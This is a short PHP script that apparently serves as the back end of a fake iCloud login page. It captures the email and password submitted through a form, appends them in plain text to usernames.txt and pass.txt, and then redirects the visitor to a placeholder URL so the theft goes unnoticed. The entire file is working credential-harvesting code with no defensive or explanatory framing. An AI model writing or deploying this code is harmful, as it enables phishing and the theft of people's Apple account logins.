<?php

file_put_contents("usernames.txt", "iCloud Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "iCloud Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://redirecturl');
?>
